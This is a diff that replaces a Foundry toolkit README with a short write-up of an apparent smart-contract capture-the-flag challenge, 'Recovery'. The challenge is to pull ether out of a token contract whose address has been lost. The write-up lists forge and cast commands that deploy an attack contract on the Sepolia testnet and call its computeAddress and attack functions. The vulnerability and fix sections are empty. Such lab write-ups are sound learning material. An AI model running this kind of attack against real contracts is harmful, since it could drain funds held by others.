@@ -1,66 +1,28 @@
-## Foundry
+# Recovery
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+A contract creator has developed a simple token factory contract that allows anyone to easily create new tokens. After deploying the first token contract, the creator sent 0.001 ether to it. However, they have since lost the address of this first token contract.
 
-Foundry consists of:
+To complete this challenge, you need to recover or remove the 0.001 ether from the lost contract address.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+## Vulnerability
 
-## Documentation
+## Attack
 
-https://book.getfoundry.sh/
+1. Deploy `RecoveryAttack.sol`
 
-## Usage
+```bash
+forge script script/DeployRecoveryAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
-### Build
+# make deploy ARGS="--network sepolia"
+# https://sepolia.etherscan.io/address/0x6f5c067b429652Bfa30e06227307f17eAdEfc76A
 
-```shell
-$ forge build
+2. Attack
+
+```bash
+cast send $CONTRACT_ADDRESS "computeAddress()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
+
+cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 ```
 
-### Test
+## Fix
 
-```shell
-$ forge test
-```
-
-### Format
-
-```shell
-$ forge fmt
-```
-
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
